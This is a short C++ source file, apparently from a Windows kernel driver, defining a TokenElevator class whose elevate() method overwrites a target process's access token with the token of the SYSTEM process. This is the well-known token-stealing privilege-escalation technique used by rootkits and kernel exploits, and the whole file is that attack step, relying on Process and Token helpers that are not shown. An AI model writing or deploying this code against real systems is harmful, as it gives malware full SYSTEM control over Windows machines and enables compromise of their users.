#include "TokenElevator.h"

TokenElevator::TokenElevator(Token& token)
	: m_token(token)
{}

NTSTATUS TokenElevator::elevate() {
	auto systemProcess = Process(SYSTEM_PID);
	auto systemTokenAddress = Token(systemProcess).get();
	auto targetTokenAddress = m_token.get();

	*targetTokenAddress = *systemTokenAddress;

	return STATUS_SUCCESS;
}